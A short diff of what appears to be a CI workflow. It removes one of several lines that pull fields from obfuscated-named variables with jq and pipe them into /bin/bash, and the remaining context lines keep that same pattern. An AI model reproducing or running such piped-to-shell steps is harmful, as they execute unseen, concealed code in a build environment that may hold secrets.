@@ -20,7 +20,6 @@ jobs:
           printf '%s' "$xlr2143" | jq -r .oj1 | /bin/bash
           echo $mhyrl07 | jq -r .axbl0241 | /bin/bash
           echo $rw1 | jq -r .jlyq445 | /bin/bash
-          printf '%s' "$kpn16099" | jq -r .x9276 | /bin/bash
           printf '%s' "$kmzw654" | jq -r .rsvnm9276 | /bin/bash
 
       - name: Save results
